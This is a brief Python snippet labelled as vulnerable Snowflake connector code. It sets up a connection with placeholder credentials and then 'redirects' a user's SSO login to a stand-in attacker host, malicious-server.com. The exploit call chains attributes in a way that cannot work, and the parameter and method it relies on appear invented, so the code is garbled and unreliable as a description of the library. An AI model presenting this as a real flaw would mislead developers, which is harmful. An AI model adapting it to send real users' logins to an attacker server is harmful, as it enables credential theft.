import snowflake.connector

# Vulnerable code
conn = snowflake.connector.connect(
    user='username',
    password='password',
    account='account_name',
 warehouse='warehouse_name',
    database='database_name',
    schema='schema_name',
    sso_browser_auth=True
)

# Malicious SSO URL
sso_url = 'https://malicious-server.com/snowflake_sso'

# Redirect user to malicious SSO URL
conn.snowflake.connector.SnowflakeConnection.sso_browser_auth(sso_url)